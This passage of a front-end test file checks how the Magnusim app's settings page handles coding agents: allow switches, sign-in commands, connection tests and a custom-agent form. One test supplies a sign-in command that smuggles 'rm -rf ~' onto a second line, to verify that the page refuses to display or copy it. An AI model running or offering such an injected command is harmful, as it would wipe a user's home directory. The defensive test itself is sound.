    expect(confirmAction).toHaveBeenCalledTimes(1);
    expect(posts('/api/assistant/agents/allow')).toHaveLength(1);
    await act(async () => hold.release());
    await waitFor(() =>
      expect(posts('/api/assistant/agents/allow')).toEqual([
        { id: 'codex', allow: true, fingerprint: FP2 },
        { id: 'codex', allow: false },
      ]),
    );
    await waitFor(() => expect(stateOf('codex')).toBe('needs_allow'));
    expect(sw()).not.toBeChecked();
    // The switch takes a new save once that one is done.
    fireEvent.click(sw());
    await waitFor(() => expect(stateOf('codex')).toBe('ready'));
    expect(confirmAction).toHaveBeenCalledTimes(2);
  });

  it('an allow the server still keeps that no longer counts (the command changed, or the agent is gone) has Turn off: no question, it POSTs allow false', async () => {
    rows = [codex({ allow_changed: true, reason: 'agent_allow_changed' }), { ...missing('gemini', 'Gemini CLI', 'npm install -g @google/gemini-cli'), allow_changed: true }, codex({ id: 'codex2', name: 'Codex Two' })];
    await renderAgents();
    const off = within(agent('codex')).getByRole('button', { name: TURN_OFF_LABEL });
    expect(TURN_OFF_LABEL).toBe('Turn off');
    expect(off).toHaveAccessibleDescription(turnOffNote('Codex'));
    expect(turnOffNote('Codex')).toBe('Anything Codex started while it was allowed may still be running. Turn off stops it and clears its switch.');
    expect(within(agent('gemini')).getByRole('button', { name: TURN_OFF_LABEL })).toBeInTheDocument();
    // An agent never allowed has none.
    expect(within(agent('codex2')).queryByRole('button', { name: TURN_OFF_LABEL })).toBeNull();
    // A refusal says why (an alert) and keeps the button.
    allowAnswer = { status: 500, body: { ok: false, code: 'save_failed', error: "Codex was stopped, but Magnusim couldn't save its switch as off. Turn it off again." } };
    fireEvent.click(off);
    await waitFor(() => expect(agent('codex').querySelector('[data-assistant-agent-turn-off-error]')).toHaveTextContent("couldn't save its switch as off"));
    expect(agent('codex').querySelector('[data-assistant-agent-turn-off-error]')).toHaveAttribute('role', 'alert');
    allowAnswer = null;
    fireEvent.click(within(agent('codex')).getByRole('button', { name: TURN_OFF_LABEL }));
    await waitFor(() => expect(stateOf('codex')).toBe('needs_allow'));
    expect(posts('/api/assistant/agents/allow')).toEqual([
      { id: 'codex', allow: false },
      { id: 'codex', allow: false },
    ]);
    expect(confirmAction).not.toHaveBeenCalled();
    expect(within(agent('codex')).queryByRole('button', { name: TURN_OFF_LABEL })).toBeNull();
    // The focus goes to the switch (to allow it again).
    expect(document.activeElement).toBe(within(agent('codex')).getByRole('switch', { name: 'Allow this agent' }));
    fireEvent.click(within(agent('gemini')).getByRole('button', { name: TURN_OFF_LABEL }));
    await waitFor(() => expect(within(agent('gemini')).queryByRole('button', { name: TURN_OFF_LABEL })).toBeNull());
    expect(posts('/api/assistant/agents/allow')[2]).toEqual({ id: 'gemini', allow: false });
    expect(stateOf('gemini')).toBe('missing');
    expect(document.activeElement).toBe(agent('gemini'));
    expect(holdsOldAllow({ found: true, error: "can't start", allowed: true, allow_changed: false })).toBe(true);
    expect(holdsOldAllow({ found: true, error: null, allowed: true, allow_changed: false })).toBe(false);
  });
});

describe('Coding agents: sign in (spec 4.12)', () => {
  const terminal = { id: 'claude-login', name: 'Log in with Claude', type: 'terminal', command: { program: 'claude-agent-acp', args: ['--cli', 'auth', 'login'], env: [], line: 'claude-agent-acp --cli auth login' } };

  it('a terminal command the server gave: shown with Copy, which copies exactly it', async () => {
    rows = [row({ signed_in: 'no', ready: false, reason: 'agent_signed_out', sign_in: { methods: [terminal] } })];
    await renderAgents();
    const block = agent('claude').querySelector('[data-assistant-agent-signin]')!;
    expect(within(block as HTMLElement).getByText(SIGNIN_TERMINAL_TEXT)).toBeInTheDocument();
    expect(SIGNIN_TERMINAL_TEXT).toBe('Run this in a terminal, sign in there, then come back:');
    expect(block.querySelector('[data-assistant-agent-signin-command="claude-login"]')!.textContent).toBe('claude-agent-acp --cli auth login');
    expect(block.querySelector('[data-assistant-agent-signin-docs]')).toBeNull();
    fireEvent.click(block.querySelector('[data-assistant-agent-signin-copy="claude-login"]')!);
    await waitFor(() => expect(writeText).toHaveBeenCalledWith('claude-agent-acp --cli auth login'));
    await waitFor(() => expect(block.querySelector('[data-assistant-agent-signin-copied]')).toHaveTextContent('Copied.'));
  });

  it('a method the server marked unsafe (no command) shows no command and no Copy, only the documentation line', async () => {
    rows = [row({ signed_in: 'no', ready: false, sign_in: { methods: [{ ...terminal, command: null }] } })];
    await renderAgents();
    const block = agent('claude').querySelector('[data-assistant-agent-signin]')!;
    expect(block.querySelector('[data-assistant-agent-signin-command], [data-assistant-agent-signin-copy]')).toBeNull();
    expect(block.querySelector('[data-assistant-agent-signin-docs]')!.textContent).toBe(signInDocsText('Claude Code'));
  });

  it('an agent whose own tools stay on and that is not allowed never gets a command to paste, whatever the server sent', async () => {
    const login = { ...terminal, id: 'codex-login', command: 'codex-acp login' };
    // Not allowed: the switch and its warning, no Sign in block at all.
    rows = [codex({ signed_in: 'no', reason: 'agent_not_allowed', sign_in: { methods: [login] } })];
    await renderAgents();
    expect(stateOf('codex')).toBe('needs_allow');
    expect(document.querySelector('[data-assistant-agent-signin], [data-assistant-agent-signin-command]')).toBeNull();
    cleanup();
    resetStatusStore();
    // A row that says it needs no switch while its class is 'none' (the server's rule 1 broken): still no command.
    rows = [codex({ needs_allow: false, signed_in: 'no', reason: 'agent_signed_out', sign_in: { methods: [login] } })];
    await renderAgents();
    expect(stateOf('codex')).toBe('signed_out');
    const block = agent('codex').querySelector('[data-assistant-agent-signin]')!;
    expect(block.querySelector('[data-assistant-agent-signin-command], [data-assistant-agent-signin-copy]')).toBeNull();
    expect(block.querySelector('[data-assistant-agent-signin-docs]')!.textContent).toBe(signInDocsText('Codex'));
    expect(mayShowSignInCommand({ lockdown: 'none', allowed: false })).toBe(false);
    expect(mayShowSignInCommand({ lockdown: 'none', allowed: true })).toBe(true);
    expect(mayShowSignInCommand({ lockdown: 'tools_off', allowed: false })).toBe(true);
  });

  it('an agent method is a button that asks the agent to sign in by itself; a variable is a line; a missing route says so', async () => {
    rows = [
      row({
        signed_in: 'no',
        ready: false,
        sign_in: { methods: [{ id: 'browser', name: 'Sign in with a browser', type: 'agent' }, { id: 'key', name: 'Use a key', type: 'env_var', vars: ['ANTHROPIC_API_KEY'] }] },
      }),
    ];
    await renderAgents();
    const r = agent('claude');
    expect(within(r).getByText(SIGNIN_AGENT_NOTE)).toBeInTheDocument();
    expect(SIGNIN_AGENT_NOTE).toBe('It opens your browser or asks in its own window.');
    expect(r.querySelector('[data-assistant-agent-signin-var="ANTHROPIC_API_KEY"]')!.textContent).toBe(signInVarText('ANTHROPIC_API_KEY'));
    expect(signInVarText('ANTHROPIC_API_KEY')).toBe('Or set ANTHROPIC_API_KEY in your environment and restart Magnusim.');
    // No command and an agent method: no documentation line.
    expect(r.querySelector('[data-assistant-agent-signin-docs]')).toBeNull();
    fireEvent.click(within(r).getByRole('button', { name: 'Sign in with a browser' }));
    await waitFor(() => expect(r.querySelector('[data-assistant-agent-result]')).toHaveTextContent(NO_SIGN_IN_TEXT));
    expect(posts('/api/assistant/agents/sign-in')).toEqual([{ id: 'claude', method: 'browser' }]);
    signInAnswer = { status: 200, body: { ok: true } };
    fireEvent.click(within(r).getByRole('button', { name: 'Sign in with a browser' }));
    await waitFor(() => expect(r.querySelector('[data-assistant-agent-result]')).toHaveTextContent('Claude Code finished signing in. Connect again to check.'));
  });

  it("I've signed in: connect again sends no message; the agent says it is signed in, and the row is ready with focus kept in it", async () => {
    rows = [row({ signed_in: 'no', ready: false, reason: 'agent_signed_out' })];
    holdTest = deferred();
    testAnswer = { status: 200, body: { ok: true, agent: 'claude-agent-acp', version: '0.85.2', ms: 900, signed_in: 'no', auth_status: 'signed_in', own_tools: 'off', images: true, modes: [], models: [], tools: null } };
    await renderAgents();
    const again = within(agent('claude')).getByRole('button', { name: CONNECT_AGAIN });
    again.focus();
    fireEvent.click(again);
    await waitFor(() => expect(stateOf('claude')).toBe('testing'));
    expect(agent('claude').querySelector('[data-assistant-agent-result]')).toHaveTextContent('Connecting to Claude Code…');
    // The block stays while it connects (its button keeps the focus).
    expect(document.activeElement).toBe(again);
    await act(async () => holdTest!.release());
    await waitFor(() => expect(stateOf('claude')).toBe('ready'));
    expect(posts('/api/assistant/agents/test')).toEqual([{ id: 'claude', message: false }]);
    expect(agent('claude').querySelector('[data-assistant-agent-result]')!.textContent).toBe('Connected to Claude Code 0.85.2.');
    expect(agent('claude').querySelector('[data-assistant-agent-signin]')).toBeNull();
    // The button that had the focus went with the block: the focus is on Test, in the row.
    expect(document.activeElement).toBe(within(agent('claude')).getByRole('button', { name: 'Test' }));
  });

  it("connect again on a row with no login file, the agent saying it isn't signed in: never Connected or ready; the Sign in block stays with the ways it listed (its word wins)", async () => {
    rows = [row({ signed_in: 'no', ready: false, reason: 'agent_signed_out' })];
    testAnswer = {
      status: 200,
      body: { ok: true, agent: 'claude-agent-acp', version: '0.85.2', ms: 900, signed_in: 'no', auth_status: 'none', own_tools: 'off', images: true, modes: [], models: [], tools: null, auth: [terminal] },
    };
    await renderAgents();
    const r = agent('claude');
    expect(within(r).queryByRole('button', { name: 'Test' })).toBeNull();
    fireEvent.click(within(r).getByRole('button', { name: CONNECT_AGAIN }));
    await waitFor(() => expect(r.querySelector('[data-assistant-agent-result="failed"]')).toBeTruthy());
    expect(posts('/api/assistant/agents/test')).toEqual([{ id: 'claude', message: false }]);
    expect(stateOf('claude')).toBe('signed_out');
    const failed = r.querySelector('[data-assistant-agent-result="failed"]')!;
    expect(failed.textContent).toBe(connectedSignedOutText('Claude Code 0.85.2'));
    expect(failed).toHaveAttribute('role', 'alert');
    expect(r.textContent).not.toContain('Connected to Claude Code 0.85.2.');
    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_NO} · ${OWN_TOOLS_OFF}`);
    // The Sign in block stays, with the ways the agent listed; no Test.
    const block = within(r).getByRole('group', { name: signInHeading('Claude Code') });
    expect(block.querySelector('[data-assistant-agent-signin-command="claude-login"]')!.textContent).toBe('claude-agent-acp --cli auth login');
    expect(within(r).queryByRole('button', { name: 'Test' })).toBeNull();
    expect(r).toHaveAttribute('data-ready', '0');
  });

  it("connect again that hears nothing from the agent on a row with no login file: connected, but whether it is signed in can't be told, and Test (which will say) is offered", async () => {
    rows = [row({ signed_in: 'no', ready: false, reason: 'agent_signed_out' })];
    testAnswer = { status: 200, body: { ok: true, agent: 'claude-agent-acp', version: '0.85.2', ms: 900, signed_in: 'no', auth_status: null, own_tools: 'off', images: true, modes: [], models: [], tools: null } };
    await renderAgents();
    const r = agent('claude');
    fireEvent.click(within(r).getByRole('button', { name: CONNECT_AGAIN }));
    await waitFor(() => expect(r.querySelector('[data-assistant-agent-result="ok"]')).toBeTruthy());
    expect(r.querySelector('[data-assistant-agent-result="ok"]')!.textContent).toBe(connectedUnsureText('Claude Code 0.85.2'));
    expect(connectedUnsureText('Claude Code 0.85.2')).toBe("Connected to Claude Code 0.85.2. Magnusim can't tell whether it is signed in; Test will say.");
    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_UNKNOWN} · ${OWN_TOOLS_OFF}`);
    expect(stateOf('claude')).toBe('ready');
    expect(within(r).getByRole('button', { name: 'Test' })).toBeInTheDocument();
    expect(r.querySelector('[data-assistant-agent-signin]')).toBeNull();
    // Signed in since (its login file there now): Refresh, and the file decides again.
    rows = [row({ signed_in: 'yes' })];
    fireEvent.click(q('[data-assistant-agents-refresh]')!);
    await waitFor(() => expect(agent('claude').querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_YES} · ${OWN_TOOLS_OFF}`));
    expect(stateOf('claude')).toBe('ready');
  });

  it('a connect that asks to sign in is an error with the Sign in block of its ways', async () => {
    rows = [row({ signed_in: 'unknown' })];
    testAnswer = { status: 200, body: { ok: false, code: 'agent_signin', error: 'Claude Code asks you to sign in first.', auth: [terminal] } };
    await renderAgents();
    fireEvent.click(within(agent('claude')).getByRole('button', { name: 'Test' }));
    await waitFor(() => expect(stateOf('claude')).toBe('error'));
    expect(agent('claude').querySelector('[data-assistant-agent-result]')).toHaveTextContent('Claude Code asks you to sign in first.');
    expect(agent('claude').querySelector('[data-assistant-agent-result]')).toHaveAttribute('role', 'alert');
    expect(agent('claude').querySelector('[data-assistant-agent-signin-command="claude-login"]')!.textContent).toBe('claude-agent-acp --cli auth login');
    // The agent asked to sign in: the line says so, whatever its login file says.
    expect(agent('claude').querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_NO} · ${OWN_TOOLS_OFF}`);
  });

  it("the server's sign-in block from the last auth_required shows when the page opens, over a login file and a check's listed choices; a connect that gets through clears it", async () => {
    const browser = { id: 'browser', name: 'Sign in with a browser', type: 'agent' };
    rows = [
      row({ signed_in: 'yes', sign_in: { methods: [browser] }, last: { modes: [], models: [{ id: 'opus', name: 'Opus' }], at: 'now' } }),
      row({ id: 'b', name: 'B', signed_in: 'key', key_var: 'B_API_KEY', sign_in: { methods: [terminal] } }),
    ];
    testAnswer = { status: 200, body: { ok: true, agent: 'claude-agent-acp', version: '0.85.1', ms: 700, signed_in: 'yes', own_tools: 'off', images: true, modes: [], models: [], tools: null } };
    await renderAgents();
    expect(stateOf('claude')).toBe('signed_out');
    const r = agent('claude');
    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_NO} · ${OWN_TOOLS_OFF}`);
    const block = within(r).getByRole('group', { name: signInHeading('Claude Code') });
    expect(within(block).getByRole('button', { name: 'Sign in with a browser' })).toBeInTheDocument();
    expect(within(r).queryByRole('button', { name: 'Test' })).toBeNull();
    expect(stateOf('b')).toBe('signed_out');
    expect(agent('b').querySelector('[data-assistant-agent-signin-command="claude-login"]')!.textContent).toBe('claude-agent-acp --cli auth login');
    // Connect again gets through: the server forgets the block (the row read again), and the row is ready.
    rows = [row({ signed_in: 'yes' }), rows[1]];
    fireEvent.click(within(block).getByRole('button', { name: CONNECT_AGAIN }));
    await waitFor(() => expect(stateOf('claude')).toBe('ready'));
    expect(posts('/api/assistant/agents/test')).toEqual([{ id: 'claude', message: false }]);
    await waitFor(() => expect(listReads().length).toBeGreaterThan(1));
    expect(agent('claude').querySelector('[data-assistant-agent-signin]')).toBeNull();
    expect(agent('claude').querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_YES} · ${OWN_TOOLS_OFF}`);
  });

  it("a connect that gets through to an agent that says it isn't signed in: the line says so, with the Sign in block; its login file alone doesn't make it signed in", async () => {
    rows = [row({ signed_in: 'yes' })];
    await renderAgents();
    // A Test the agent answers with "sign in first" brings the block; then connect again gets
    // through, and the agent says (its auth status) that it isn't signed in.
    testAnswer = { status: 200, body: { ok: false, code: 'agent_signin', error: 'Claude Code asks you to sign in first.', auth: [] } };
    fireEvent.click(within(agent('claude')).getByRole('button', { name: 'Test' }));
    await waitFor(() => expect(stateOf('claude')).toBe('error'));
    testAnswer = { status: 200, body: { ok: true, agent: 'claude-agent-acp', version: '0.85.1', ms: 700, signed_in: 'yes', auth_status: 'none', own_tools: 'off', images: true, modes: [], models: [], tools: null } };
    fireEvent.click(within(agent('claude')).getByRole('button', { name: CONNECT_AGAIN }));
    await waitFor(() => expect(posts('/api/assistant/agents/test')).toHaveLength(2));
    await waitFor(() => expect(stateOf('claude')).toBe('signed_out'));
    const r = agent('claude');
    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_NO} · ${OWN_TOOLS_OFF}`);
    expect(r.querySelector('[data-assistant-agent-result]')!.textContent).toBe(connectedSignedOutText('Claude Code 0.85.1'));
    expect(connectedSignedOutText('Claude Code 0.85.1')).toBe("Connected to Claude Code 0.85.1, but it says it isn't signed in.");
    expect(within(r).getByRole('group', { name: signInHeading('Claude Code') })).toBeInTheDocument();
    expect(within(r).queryByRole('button', { name: 'Test' })).toBeNull();
    // Only the agent's own word counts (its auth status), whatever its login file says.
    const said = (auth_status: 'none' | 'signed_in' | null, tools: 'works' | null = null) =>
      ({ ok: true, agent: 'x', version: null, ms: 1, signed_in: 'no', auth_status, own_tools: 'off', images: false, modes: [], models: [], tools }) as const;
    expect(agentSaidSignedOut(said('none'))).toBe(true);
    expect(agentSaidSignedOut(said(null))).toBe(false);
    expect(agentSaidSignedOut(said('signed_in'))).toBe(false);
    // An agent that answered the Test's message is signed in, whatever it said.
    expect(agentSaidSignedOut(said('none', 'works'))).toBe(false);
  });

  it('a terminal command the page may not show (no line, more than one line, too long) gives the documentation line, even beside a button of the agent', async () => {
    const browser = { id: 'browser', name: 'Sign in with a browser', type: 'agent' };
    rows = [
      row({ id: 'a', name: 'A', signed_in: 'no', sign_in: { methods: [{ ...terminal, id: 'a-login', command: null }, browser] } }),
      row({ id: 'b', name: 'B', signed_in: 'no', sign_in: { methods: [{ ...terminal, id: 'b-login', command: 'agent login\nrm -rf ~' }] } }),
      row({ id: 'c', name: 'C', signed_in: 'no', sign_in: { methods: [{ ...terminal, id: 'c-login', command: `agent ${'x'.repeat(600)}` }] } }),
      row({ id: 'd', name: 'D', signed_in: 'no', sign_in: { methods: [{ ...terminal, id: 'd-login', command: 'agent login\r' }, browser] } }),
    ];
    await renderAgents();
    for (const [id, name] of [
      ['a', 'A'],
      ['b', 'B'],
      ['c', 'C'],
      ['d', 'D'],
    ]) {
      const block = agent(id).querySelector('[data-assistant-agent-signin]')!;
      expect(block, id).toBeTruthy();
      expect(block.querySelector('[data-assistant-agent-signin-command], [data-assistant-agent-signin-copy]'), id).toBeNull();
      expect(block.querySelector('[data-assistant-agent-signin-docs]')!.textContent, id).toBe(signInDocsText(name));
    }
    expect(within(agent('a')).getByRole('button', { name: 'Sign in with a browser' })).toBeInTheDocument();
    expect(within(agent('d')).getByRole('button', { name: 'Sign in with a browser' })).toBeInTheDocument();
  });
});

describe('Coding agents: Test (spec 4.13)', () => {
  it('sends one short message; while it runs the row says so; the result is announced (role status)', async () => {
    holdTest = deferred();
    testAnswer = { status: 200, body: { ok: true, agent: 'claude-agent-acp', version: '0.85.1', ms: 3210, signed_in: 'yes', own_tools: 'off', images: true, modes: [], models: [], tools: 'works' } };
    await renderAgents();
    const r = agent('claude');
    const result = r.querySelector('[data-assistant-agent-result]')!;
    expect(result).toHaveAttribute('role', 'status');
    fireEvent.click(within(r).getByRole('button', { name: 'Test' }));
    await waitFor(() => expect(stateOf('claude')).toBe('testing'));
    expect(result.textContent).toBe(testingText('Claude Code'));
    expect(testingText('Claude Code')).toBe('Testing: starting Claude Code and sending it one short message…');
    // A second click while it runs sends nothing more.
    fireEvent.click(within(r).getByRole('button', { name: 'Testing…' }));
    await act(async () => holdTest!.release());
    await waitFor(() => expect(result).toHaveAttribute('data-assistant-agent-result', 'ok'));
    expect(posts('/api/assistant/agents/test')).toEqual([{ id: 'claude', message: true }]);
    expect(result.textContent).toBe(`Claude Code 0.85.1 answered in 3.2 s and called Magnusim's test tool. ${OWN_TOOLS_OFF}`);
    expect(stateOf('claude')).toBe('ready');
    // The row is read again (its modes and models).
    await waitFor(() => expect(listReads().length).toBeGreaterThan(1));
  });

  it("an agent that didn't call the test tool, a refusal, and a server without the Test route: each an alert (the error state's text, spec 5.6)", async () => {
    testAnswer = { status: 200, body: { ok: true, agent: 'x', version: null, ms: 1500, signed_in: 'yes', own_tools: 'off', images: false, modes: [], models: [], tools: 'not_used' } };
    await renderAgents();
    const r = agent('claude');
    const result = () => r.querySelector('[data-assistant-agent-result]')!;
    fireEvent.click(within(r).getByRole('button', { name: 'Test' }));
    await waitFor(() => expect(result()).toHaveAttribute('data-assistant-agent-result', 'failed'));
    expect(result()).toHaveAttribute('role', 'alert');
    expect(result().textContent).toBe(
      "Claude Code answered in 1.5 s but didn't call Magnusim's test tool, so it may not use Magnusim's tools. Test again, or check the agent's own settings.",
    );
    // It answered: the row stays ready.
    expect(stateOf('claude')).toBe('ready');
    testAnswer = { status: 409, body: { ok: false, code: 'busy', error: 'Another Test is running. Wait for it to finish.' } };
    fireEvent.click(within(r).getByRole('button', { name: 'Test' }));
    await waitFor(() => expect(result().textContent).toBe('Another Test is running. Wait for it to finish.'));
    expect(stateOf('claude')).toBe('error');
    expect(within(r).getByRole('alert')).toHaveTextContent('Another Test is running. Wait for it to finish.');
    // The polite region says nothing while the alert does.
    expect(within(r).getByRole('status').textContent).toBe('');
    testAnswer = NOT_FOUND;
    fireEvent.click(within(r).getByRole('button', { name: 'Test' }));
    await waitFor(() => expect(result().textContent).toBe(NO_AGENT_TEST_TEXT));
    expect(result()).toHaveAttribute('role', 'alert');
    expect(NO_AGENT_TEST_TEXT).toBe("This copy of Magnusim can't test coding agents yet.");
  });

  it('a result is about the program and switch it ran with: the switch turned starts the row afresh', async () => {
    rows = [codex({ allowed: true, ready: true, reason: null })];
    testAnswer = { status: 200, body: { ok: false, code: 'agent_exited', error: 'Codex stopped before it answered.' } };
    confirmAction.mockResolvedValue(true);
    await renderAgents();
    const r = agent('codex');
    fireEvent.click(within(r).getByRole('button', { name: 'Test' }));
    await waitFor(() => expect(stateOf('codex')).toBe('error'));
    expect(r.querySelector('[data-assistant-agent-result]')!.textContent).toBe('Codex stopped before it answered.');
    const sw = within(r).getByRole('switch', { name: 'Allow this agent' });
    fireEvent.click(sw);
    await waitFor(() => expect(stateOf('codex')).toBe('needs_allow'));
    fireEvent.click(sw);
    await waitFor(() => expect(stateOf('codex')).toBe('ready'));
    expect(agent('codex').querySelector('[data-assistant-agent-result]')!.textContent).toBe('');
  });

  it('agentTestLine: each answer (spec 5.7)', () => {
    const r = { name: 'Codex', version: '2.1.1', own_tools: 'on' as const };
    const ok = { ok: true as const, agent: 'codex-acp', version: '2.1.1', ms: 2000, signed_in: 'yes' as const, own_tools: 'on' as const, images: false, modes: [], models: [] };
    expect(agentTestLine({ ...ok, tools: 'works' }, r, true)).toEqual({ ok: true, text: `Codex 2.1.1 answered in 2.0 s and called Magnusim's test tool. ${OWN_TOOLS_ON}` });
    expect(agentTestLine({ ...ok, tools: null }, r, false)).toEqual({ ok: true, text: 'Connected to Codex 2.1.1.' });
    expect(agentTestLine({ ...ok, version: null, tools: null }, { ...r, version: null }, false)).toEqual({ ok: true, text: 'Connected to Codex.' });
    expect(agentTestLine({ ok: false, code: 'agent_exited', error: 'Codex stopped.' }, r, true)).toEqual({ ok: false, text: 'Codex stopped.' });
  });
});

describe('Coding agents: model and mode', () => {
  it('shown once a Test or connect listed them; a choice saves agents.<id>.model (null: the agent\u2019s own); no Mode without modes', async () => {
    rows = [row({ last: { modes: [], models: [{ id: 'opus', name: 'Opus' }, { id: 'sonnet', name: 'Sonnet' }], at: 'now' } })];
    await renderAgents();
    const model = agent('claude').querySelector<HTMLSelectElement>('select[data-assistant-agent-model]')!;
    expect(model).toHaveAccessibleName('Model');
    expect([...model.options].map((o) => o.textContent)).toEqual(["The agent's own choice", 'Opus', 'Sonnet']);
    expect(agent('claude').querySelector('select[data-assistant-agent-mode]')).toBeNull();
    fireEvent.change(model, { target: { value: 'sonnet' } });
    await waitFor(() => expect(agent('claude').querySelector('select[data-assistant-agent-model]')).toHaveAttribute('data-assistant-agent-model', 'sonnet'));
    expect(posts('/api/assistant/settings')).toEqual([{ agents: { claude: { model: 'sonnet' } } }]);
    fireEvent.change(agent('claude').querySelector('select[data-assistant-agent-model]')!, { target: { value: '' } });
    await waitFor(() => expect(posts('/api/assistant/settings')).toHaveLength(2));
    expect(posts('/api/assistant/settings')[1]).toEqual({ agents: { claude: { model: null } } });
  });

  it('Mode offers only the modes Magnusim uses with the agent, "none" saying what Magnusim sets: no select with nothing to choose (one mode it sets anyway), for one kept in the mode it starts in, or when the server says nothing', async () => {
    const listed = [
      { id: 'default', name: 'Default' },
      { id: 'acceptEdits', name: 'Accept edits' },
      { id: 'read-only', name: 'Read only' },
      { id: 'bypassPermissions', name: 'Bypass' },
    ];
    const last = { modes: listed, models: [], at: 'now' };
    rows = [
      row({ allowed_modes: ['default'], last }),
      codex({ allowed: true, ready: true, reason: null, allowed_modes: ['read-only'], last }),
      codex({ id: 'custom-0a0a0a', name: 'Mine', kind: 'custom', allowed: true, ready: true, reason: null, allowed_modes: 'initial', last }),
      row({ id: 'opencode', name: 'OpenCode', allowed_modes: 'initial', last }),
      row({ id: 'old', name: 'Old server', last }),
      row({ id: 'two', name: 'Two', allowed_modes: ['acceptEdits', 'default'], last }),
      row({ id: 'unlisted', name: 'Unlisted', allowed_modes: ['plan', 'default'], last }),
      row({ id: 'stale', name: 'Stale', allowed_modes: ['default'], mode: 'acceptEdits', last }),
    ];
    await renderAgents();
    const options = (id: string) => [...agent(id).querySelectorAll<HTMLOptionElement>('select[data-assistant-agent-mode] option')].map((o) => [o.value, o.textContent]);
    // Only the mode Magnusim sets at every start anyway: nothing to choose.
    for (const id of ['claude', 'codex', 'custom-0a0a0a', 'opencode', 'old']) expect(agent(id).querySelector('select[data-assistant-agent-mode]'), id).toBeNull();
    // "None" is the first mode Magnusim uses (it sets it, over the person's own default).
    expect(options('two')).toEqual([
      ['', "Accept edits (Magnusim's choice)"],
      ['default', 'Default'],
      ['acceptEdits', 'Accept edits'],
    ]);
    // That one not listed by the agent: nothing is set, it stays in the mode it starts in.
    expect(options('unlisted')).toEqual([
      ['', 'The mode it starts in'],
      ['default', 'Default'],
    ]);
    // A saved mode no longer offered still shows, beside the one Magnusim sets.
    expect(options('stale')).toEqual([
      ['', "Default (Magnusim's choice)"],
      ['acceptEdits', 'acceptEdits'],
      ['default', 'Default'],
    ]);
    expect(modeChoice(readAgentRow(row({ allowed_modes: ['default'], mode: 'default', last }))!)).toBeNull();
    expect(offeredModes(readAgentRow(row({ allowed_modes: ['plan'], last }))!)).toEqual([]);
    expect(readAgentRow(row({ allowed_modes: 'initial' }))!.allowed_modes).toBe('initial');
    expect(readAgentRow(row({ allowed_modes: ['a', 3, 'b'] }))!.allowed_modes).toEqual(['a', 'b']);
    expect(readAgentRow(row({ allowed_modes: 'all' }))!.allowed_modes).toBeNull();
  });

  it('a mode outside the allowed ones is refused with its reason; no select before a check listed anything', async () => {
    rows = [row({ allowed_modes: ['default', 'plan'], last: { modes: [{ id: 'default', name: 'Default' }, { id: 'plan', name: 'Plan' }], models: [], at: 'now' } }), row({ id: 'b', name: 'B', allowed_modes: ['default'] })];
    settingsAnswer = { status: 400, body: { ok: false, error: 'Magnusim does not use that mode for this agent.', field: 'agents.mode' } };
    await renderAgents();
    const mode = agent('claude').querySelector<HTMLSelectElement>('select[data-assistant-agent-mode]')!;
    expect(mode).toHaveAccessibleName('Mode');
    fireEvent.change(mode, { target: { value: 'plan' } });
    await waitFor(() => expect(agent('claude').querySelector('[data-assistant-agent-choice-error]')).toHaveTextContent('Magnusim does not use that mode for this agent.'));
    expect(mode).toHaveAttribute('aria-invalid', 'true');
    expect(agent('b').querySelector('select')).toBeNull();
  });
});

describe('Coding agents: a custom agent', () => {
  it('Add a custom agent… opens the form (focus on Name) with its help; Add sends the name, command and variables; the new row needs its switch and has the focus', async () => {
    await renderAgents();
    const open = q<HTMLButtonElement>('[data-assistant-agent-add-open]')!;
    expect(open).toHaveAttribute('aria-expanded', 'false');
    fireEvent.click(open);
    const form = q('[data-assistant-agent-custom-form]')!;
    expect(open).toHaveAttribute('aria-expanded', 'true');
    expect(open).toHaveAttribute('aria-controls', form.id);
    expect(document.activeElement).toBe(q('[data-assistant-agent-custom-name]'));
    expect(q('[data-assistant-agent-custom-help]')!.textContent).toBe(CUSTOM_HELP);
    expect(CUSTOM_HELP).toBe(
      'The program and its arguments, for example C:\\Tools\\my-agent.exe --acp. Magnusim starts it directly, never through a command shell. It must speak the agent protocol (ACP) on its input and output.',
    );
    expect(within(form).getByRole('group', { name: 'Variables to pass (optional)' })).toHaveAccessibleDescription(VARS_HELP);
    expect(VARS_HELP).toBe("It gets only basic environment variables (PATH, your folders, proxies). List any others it needs, such as its own key's variable.");
    fireEvent.change(within(form).getByLabelText('Name'), { target: { value: 'My agent' } });
    fireEvent.change(within(form).getByLabelText('Command'), { target: { value: 'C:\\agents\\my-agent.exe --acp' } });
    expect(within(form).getByLabelText('Command')).toHaveAccessibleDescription(CUSTOM_HELP);
    // Variables: added and removed here only (browser-side), up to 8.
    fireEvent.click(within(form).getByRole('button', { name: 'Add a variable' }));
    await waitFor(() => expect(document.activeElement).toBe(within(form).getByLabelText('Variable 1')));
    fireEvent.change(within(form).getByLabelText('Variable 1'), { target: { value: 'MY_AGENT_KEY' } });
    fireEvent.click(within(form).getByRole('button', { name: 'Add a variable' }));
    fireEvent.change(within(form).getByLabelText('Variable 2'), { target: { value: 'DROP_ME' } });
    fireEvent.click(within(form).getByRole('button', { name: 'Remove variable 2 (DROP_ME)' }));
    await waitFor(() => expect(within(form).queryByLabelText('Variable 2')).toBeNull());
    expect(document.activeElement).toBe(within(form).getByLabelText('Variable 1'));
    expect(requests.filter((r) => r.path.startsWith('/api/assistant/agents/custom'))).toEqual([]);
    fireEvent.click(within(form).getByRole('button', { name: 'Add' }));
    await waitFor(() => expect(q('[data-assistant-agent="custom-a1b2c3"]')).toBeTruthy());
    expect(posts('/api/assistant/agents/custom')).toEqual([{ name: 'My agent', command: 'C:\\agents\\my-agent.exe --acp', keep_env: ['MY_AGENT_KEY'] }]);
    expect(q('[data-assistant-agent-custom-form]')).toBeNull();
    expect(stateOf('custom-a1b2c3')).toBe('needs_allow');
    expect(agent('custom-a1b2c3').querySelector('[data-assistant-agent-allow-warning]')!.textContent).toBe(allowWarning('My agent'));
    await waitFor(() => expect(document.activeElement).toBe(agent('custom-a1b2c3')));
